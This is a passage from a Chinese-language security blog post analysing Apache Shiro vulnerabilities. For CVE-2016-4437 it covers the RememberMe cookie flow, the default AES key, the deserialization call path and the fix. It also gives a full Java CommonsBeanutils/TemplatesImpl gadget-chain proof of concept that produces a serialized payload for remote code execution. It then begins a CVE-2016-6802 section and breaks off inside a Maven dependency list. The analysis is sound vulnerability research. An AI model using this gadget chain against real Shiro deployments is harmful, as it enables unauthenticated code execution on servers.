<h5 id="AbstractRememberMeManager"><a href="#AbstractRememberMeManager" class="headerlink" title="AbstractRememberMeManager"></a>AbstractRememberMeManager</h5><p><code>org.apache.shiro.mgt.AbstractRememberMeManager</code> 接口是  <code>RememberMeManager</code> 接口的一个抽象实现。它提供了一些字段和方法，以便于记住用户身份（“RememberMe”）功能的实现。以下是该类的关键的功能及其结构的介绍：</p>
<h6 id="主要字段"><a href="#主要字段" class="headerlink" title="主要字段"></a>主要字段</h6><ul>
<li><p><code>DEFAULT_CIPHER_KEY_BYTES</code> 是一个默认的 Base64 编码 AES 密钥。也就是漏洞描述中提到的密钥。</p>
</li>
<li><p><code>serializer</code>：Shiro 的序列化器，用于将 PrincipalCollection 实例转换为&#x2F;转换为字节数组的序列器。默认情况下，它使用 <code>DefaultSerializer</code>，但可以通过 <code>setSerializer</code> 方法提供自定义序列化器。</p>
</li>
</ul>
<h6 id="关键方法"><a href="#关键方法" class="headerlink" title="关键方法"></a>关键方法</h6><ul>
<li><code>rememberIdentity</code>: 记住指定的身份信息。</li>
<li><code>getRememberedPrincipals</code>: 根据上下文检索已记住的身份信息。</li>
<li><code>forgetIdentity</code>: 从持久存储中删除身份信息。</li>
<li><code>isRememberMe</code>: 检查身份验证令牌是否请求“记住我”功能。</li>
</ul>
<h5 id="CookieRememberMeManager"><a href="#CookieRememberMeManager" class="headerlink" title="CookieRememberMeManager"></a>CookieRememberMeManager</h5><p><code>org.apache.shiro.web.mgt.CookieRememberMeManager</code> 是<code>AbstractRememberMeManager</code>的实现类， 通过将用户的身份信息（<code>Subject</code> 的 <code>getPrincipals()</code> 返回的结果）序列化并存储在一个 Cookie 中来实现“记住我”功能。下次用户访问时，可以从 Cookie 中恢复用户身份。</p>
<h6 id="相关方法"><a href="#相关方法" class="headerlink" title="相关方法"></a>相关方法</h6><ul>
<li><strong><code>rememberSerializedIdentity(Subject subject, byte[] serialized)</code></strong>：<ul>
<li>该方法将序列化的用户身份信息（字节数组）进行 Base64 编码后，设置为 Cookie 的值。它首先检查给定的 <code>Subject</code> 是否是 HTTP-aware 的实例（即是否具有 HTTP 请求和响应），然后通过 HTTP 响应将 Cookie 设置为包含编码后的身份信息。</li>
</ul>
</li>
<li><strong><code>getRememberedSerializedIdentity(SubjectContext subjectContext)</code></strong>：<ul>
<li>该方法从 HTTP Cookie 中获取之前存储的身份信息，进行 Base64 解码并返回字节数组。</li>
</ul>
</li>
</ul>
<h4 id="漏洞复现-1"><a href="#漏洞复现-1" class="headerlink" title="漏洞复现"></a>漏洞复现</h4><p>这个漏洞不需要正确的账号密码，也不需要登录，但是为了获取需要的数据包，我们先要来正确登录一下。记得勾选Remember me选项。</p>
<p><img src="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20241116002949717.png" alt="image-20241116002949717"></p>
<p>登录之后，我们的返回包是一个302跳转，会让我们跳转到登录成功的页面去，同时会设置Cookie，分别设置了<code>JSESSIONID</code>和<code>rememberMe</code>参数。</p>
<p><img src="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20241116002658631.png" alt="image-20241116002658631"></p>
<p>我们再访问登录页面，数据包如下，可以看到是携带Cookie的，这个数据包就是我们需要的，我们可以通过Shiro默认秘钥构造恶意编码，触发反序列化漏洞执行命令。</p>
<p><img src="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20241116003630399.png" alt="image-20241116003630399"></p>
<p>那么我们现在重启Springboot，清理缓存，重新发送该数据包。</p>
<p><img src="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20241116004229344.png" alt="image-20241116004229344"></p>
<p>成功执行，并且无需正确的账号密码，只需要秘钥，构造恶意rememberMe值即可。</p>
<h4 id="漏洞分析-1"><a href="#漏洞分析-1" class="headerlink" title="漏洞分析"></a>漏洞分析</h4><p>我们要注意的是每一次发起请求的时候，都会来到<code>org.apache.shiro.web.servlet#doFilterInternal</code>，在前面的分析中很容易知道，而这个方法中会根据当前请求去创建一个subject，我们当时注意的是下面的代码，而现在我们关注的是<code>createSubject</code>方法。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doFilterInternal</span><span class="params">(ServletRequest servletRequest, ServletResponse servletResponse, <span class="keyword">final</span> FilterChain chain)</span></span><br><span class="line">        <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line"></span><br><span class="line">    <span class="type">Throwable</span> <span class="variable">t</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">final</span> <span class="type">ServletRequest</span> <span class="variable">request</span> <span class="operator">=</span> prepareServletRequest(servletRequest, servletResponse, chain);</span><br><span class="line">        <span class="keyword">final</span> <span class="type">ServletResponse</span> <span class="variable">response</span> <span class="operator">=</span> prepareServletResponse(request, servletResponse, chain);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">final</span> <span class="type">Subject</span> <span class="variable">subject</span> <span class="operator">=</span> createSubject(request, response);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//noinspection unchecked</span></span><br><span class="line">        subject.execute(<span class="keyword">new</span> <span class="title class_">Callable</span>() &#123;</span><br><span class="line">            <span class="keyword">public</span> Object <span class="title function_">call</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">                updateSessionLastAccessTime(request, response);</span><br><span class="line">                executeChain(request, response, chain);</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    ......</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>顺着方法调用来到<code>org.apache.shiro.mgt.DefaultSecurityManager#createSubject</code>，会调用<code>resolvePrincipals</code>方法从<code>subjectContext</code>中解析出Principals。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Subject <span class="title function_">createSubject</span><span class="params">(SubjectContext subjectContext)</span> &#123;</span><br><span class="line">    <span class="type">SubjectContext</span> <span class="variable">context</span> <span class="operator">=</span> copy(subjectContext);</span><br><span class="line"></span><br><span class="line">    context = ensureSecurityManager(context);</span><br><span class="line"></span><br><span class="line">    context = resolveSession(context);</span><br><span class="line"></span><br><span class="line">    context = resolvePrincipals(context);</span><br><span class="line"></span><br><span class="line">    <span class="type">Subject</span> <span class="variable">subject</span> <span class="operator">=</span> doCreateSubject(context);</span><br><span class="line"></span><br><span class="line">    save(subject);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> subject;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>可以看到首先从上下文获取<code>principals</code>，但是我们当前的<code>context</code>是新new出来的，只设置了<code>securityManager</code>和<code>request</code>、<code>respone</code>。所以获取的结果为null，所以调用<code>getRememberedIdentity</code>方法，获取<code>CookieRememberMeManager</code>，并调用其<code>getRememberedPrincipals</code>方法去获取<code>principals</code>。可以跟进去看看。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> SubjectContext <span class="title function_">resolvePrincipals</span><span class="params">(SubjectContext context)</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="type">PrincipalCollection</span> <span class="variable">principals</span> <span class="operator">=</span> context.resolvePrincipals();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (CollectionUtils.isEmpty(principals)) &#123;</span><br><span class="line">        log.trace(<span class="string">&quot;No identity (PrincipalCollection) found in the context.  Looking for a remembered identity.&quot;</span>);</span><br><span class="line"></span><br><span class="line">        principals = getRememberedIdentity(context);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!CollectionUtils.isEmpty(principals)) &#123;</span><br><span class="line">            log.debug(<span class="string">&quot;Found remembered PrincipalCollection.  Adding to the context to be used &quot;</span> +</span><br><span class="line">                    <span class="string">&quot;for subject construction by the SubjectFactory.&quot;</span>);</span><br><span class="line"></span><br><span class="line">            context.setPrincipals(principals);</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            log.trace(<span class="string">&quot;No remembered identity found.  Returning original context.&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> context;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> PrincipalCollection <span class="title function_">getRememberedPrincipals</span><span class="params">(SubjectContext subjectContext)</span> &#123;</span><br><span class="line">    <span class="type">PrincipalCollection</span> <span class="variable">principals</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="type">byte</span>[] bytes = getRememberedSerializedIdentity(subjectContext);</span><br><span class="line">        <span class="keyword">if</span> (bytes != <span class="literal">null</span> &amp;&amp; bytes.length &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            principals = convertBytesToPrincipals(bytes, subjectContext);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; </span><br><span class="line">    ......</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> principals;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>直接跟进，然后再跟进到<code>org.apache.shiro.mgt.CookieRememberMeManager#getRememberedSerializedIdentity</code>。这个方法会从Http请求和响应中获取Cookie中的rememberMe值。也就是我们构造的恶意编码。然后进行解码，将得到的数据返回。这时候解码出来的数据还是加密的。接着会把得到的数据用<code>org.apache.shiro.mgt.AbstractRememberMeManager#convertBytesToPrincipals</code>进行最后的处理。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="type">byte</span>[] getRememberedSerializedIdentity(SubjectContext subjectContext) &#123;</span><br><span class="line">	......</span><br><span class="line">        </span><br><span class="line">    <span class="type">WebSubjectContext</span> <span class="variable">wsc</span> <span class="operator">=</span> (WebSubjectContext) subjectContext;</span><br><span class="line">    <span class="keyword">if</span> (isIdentityRemoved(wsc)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">HttpServletRequest</span> <span class="variable">request</span> <span class="operator">=</span> WebUtils.getHttpRequest(wsc);</span><br><span class="line">    <span class="type">HttpServletResponse</span> <span class="variable">response</span> <span class="operator">=</span> WebUtils.getHttpResponse(wsc);</span><br><span class="line"></span><br><span class="line">    <span class="type">String</span> <span class="variable">base64</span> <span class="operator">=</span> getCookie().readValue(request, response);</span><br><span class="line">    <span class="keyword">if</span> (Cookie.DELETED_COOKIE_VALUE.equals(base64)) <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (base64 != <span class="literal">null</span>) &#123;</span><br><span class="line">        base64 = ensurePadding(base64);</span><br><span class="line">        ......</span><br><span class="line">        <span class="type">byte</span>[] decoded = Base64.decode(base64);</span><br><span class="line">        ......</span><br><span class="line">        <span class="keyword">return</span> decoded;</span><br><span class="line">    &#125; </span><br><span class="line">    ......</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看到先解密，然后将解密的序列化数据进行反序列化。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> PrincipalCollection <span class="title function_">convertBytesToPrincipals</span><span class="params">(<span class="type">byte</span>[] bytes, SubjectContext subjectContext)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (getCipherService() != <span class="literal">null</span>) &#123;</span><br><span class="line">        bytes = decrypt(bytes);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> deserialize(bytes);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20241117014158682.png" alt="image-20241117014158682"></p>
<p>部分调用堆栈：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">readObject:<span class="number">415</span>, ObjectInputStream (java.io)</span><br><span class="line">deserialize:<span class="number">77</span>, DefaultSerializer (org.apache.shiro.io)</span><br><span class="line">deserialize:<span class="number">514</span>, AbstractRememberMeManager (org.apache.shiro.mgt)</span><br><span class="line">convertBytesToPrincipals:<span class="number">431</span>, AbstractRememberMeManager (org.apache.shiro.mgt)</span><br><span class="line">getRememberedPrincipals:<span class="number">396</span>, AbstractRememberMeManager (org.apache.shiro.mgt)</span><br><span class="line">getRememberedIdentity:<span class="number">604</span>, DefaultSecurityManager (org.apache.shiro.mgt)</span><br><span class="line">resolvePrincipals:<span class="number">492</span>, DefaultSecurityManager (org.apache.shiro.mgt)</span><br><span class="line">createSubject:<span class="number">342</span>, DefaultSecurityManager (org.apache.shiro.mgt)</span><br></pre></td></tr></table></figure>

<h4 id="一些问题"><a href="#一些问题" class="headerlink" title="一些问题"></a>一些问题</h4><p>我们环境为什么导入CC依赖？</p>
<p>如果不导入的话，我们使用原来的POC会有如下异常：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Caused by: org.apache.shiro.util.UnknownClassException: Unable to load class named [org.apache.commons.collections.comparators.ComparableComparator] from the thread context, current, or system/application ClassLoaders.  All heuristics have been exhausted.  Class could not be found.</span><br></pre></td></tr></table></figure>

<p>意思是<code>ComparableComparator</code>这个类没有找到。可以看到<code>BeanComparator</code>类的构造函数里，如果没有指定<code>comparator</code>就会用CC依赖库里面的<code>ComparableComparator</code>。</p>
<p><img src="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20241117131219878.png" alt="image-20241117131219878"></p>
<p> <code>commons-collections</code>的 <code>&lt;optional&gt;</code> 标签被设置为 <code>true</code>，表示这是个可选依赖。</p>
<blockquote>
<p>可选依赖通常表示该依赖不是项目运行的必需部分，而是提供额外的功能或增强。如果使用者希望使用这些可选功能，他们可以在自己的项目中显式地声明该依赖。如果不声明，项目仍然可以正常运行而不会因为缺少可选依赖而出错。</p>
</blockquote>
<p><img src="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20241117035942752.png" alt="image-20241117035942752"></p>
<p>既然如此我们就去指定一个java原生库或者CB依赖里面的<code>comparator</code>，这个<code>Comparator</code>满足下面条件：</p>
<ul>
<li>实现 java.util.Comparator 接口</li>
<li>实现 java.io.Serializable 接口</li>
<li>Java、shiro或commons-beanutils自带，且兼容性强</li>
</ul>
<p>可以找到CaseInsensitiveComparator类，并且java内部核心类<code>String.java</code>中存在一个该类的静态变量。</p>
<p><img src="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20241117045807847.png" alt="image-20241117045807847"></p>
<p>生成序列化数据poc，加密可以找个AES加密脚本或者直接用java的库函数。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CB1_Shiro</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="string">&quot;C:\\Users\\asus\\Desktop\\calc.class&quot;</span>));</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;Calc&quot;</span>);</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][] &#123;code&#125;);</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line">        <span class="keyword">final</span> <span class="type">BeanComparator</span> <span class="variable">beanComparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BeanComparator</span>(<span class="literal">null</span>,String.CASE_INSENSITIVE_ORDER);</span><br><span class="line">        <span class="keyword">final</span> PriorityQueue&lt;Object&gt; queue = <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>&lt;Object&gt;(<span class="number">2</span>, beanComparator);</span><br><span class="line">        queue.add(<span class="string">&quot;1&quot;</span>);</span><br><span class="line">        queue.add(<span class="string">&quot;1&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">fieldqueue</span> <span class="operator">=</span> PriorityQueue.class.getDeclaredField(<span class="string">&quot;queue&quot;</span>);</span><br><span class="line">        fieldqueue.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        fieldqueue.set(queue,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;templates,templates&#125;);</span><br><span class="line"></span><br><span class="line">		setFieldValue(beanComparator,<span class="string">&quot;property&quot;</span>,<span class="string">&quot;outputProperties&quot;</span>);</span><br><span class="line">        serialize(queue);</span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException&#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(Filename));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ois.readObject();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="漏洞修复-1"><a href="#漏洞修复-1" class="headerlink" title="漏洞修复"></a>漏洞修复</h4><p><a target="_blank" rel="noopener" href="https://github.com/apache/shiro/commit/4d5bb000a7f3c02d8960b32e694a565c95976848">Force RememberMe cipher to be set to survive JVM restart. · apache&#x2F;shiro@4d5bb00</a></p>
<p>删掉了默认的静态秘钥，改用AesCipherService#generateNewKey生成秘钥。</p>
<p><img src="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20241117051212818.png" alt="image-20241117051212818"></p>
<h4 id="参考链接-1"><a href="#参考链接-1" class="headerlink" title="参考链接"></a>参考链接</h4><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_43263451/article/details/126186451">Shiro安全（三）：Shiro自身利用链之CommonsBeanutils_shiro利用链-CSDN博客</a></p>
<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/vuls/414754.html">shiro-web CVE-2016-4437 - FreeBuf网络安全行业门户</a></p>
<h3 id="CVE-2016-6802"><a href="#CVE-2016-6802" class="headerlink" title="CVE-2016-6802"></a>CVE-2016-6802</h3><blockquote>
<p>Apache Shiro before 1.3.2 allows attackers to bypass intended servlet filters and gain access by leveraging use of a non-root servlet context path.</p>
</blockquote>
<h4 id="漏洞信息-2"><a href="#漏洞信息-2" class="headerlink" title="漏洞信息"></a>漏洞信息</h4><p>影响版本：<code>shiro &lt; 1.3.2</code></p>
<p>漏洞成因：<code>Shiro</code>未对<code>ContextPath</code>做路径标准化导致权限绕过</p>
<p>漏洞补丁：<a target="_blank" rel="noopener" href="https://github.com/apache/shiro/commit/b15ab927709ca18ea4a02538be01919a19ab65af">Added fix to adjust how the servlet context path is handled · apache&#x2F;shiro@b15ab92</a></p>
<h4 id="漏洞环境-2"><a href="#漏洞环境-2" class="headerlink" title="漏洞环境"></a>漏洞环境</h4><p>该漏洞需要用到Java Servlet 应用程序环境，依赖如下：</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- Shiro Web Dependency --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.shiro<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>shiro-core<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.3.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.shiro<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>shiro-web<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.3.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!-- Servlet Dependency --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>javax.servlet<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>javax.servlet-api<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>4.0.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">scope</span>&gt;</span>provided<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!-- JSP Dependency --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>javax.servlet.jsp<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>javax.servlet.jsp-api<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.3.3<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">scope</span>&gt;</span>provided<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!-- Logging Dependency --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.slf4j<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>slf4j-api<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.7.25<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.slf4j<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>slf4j-simple<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span 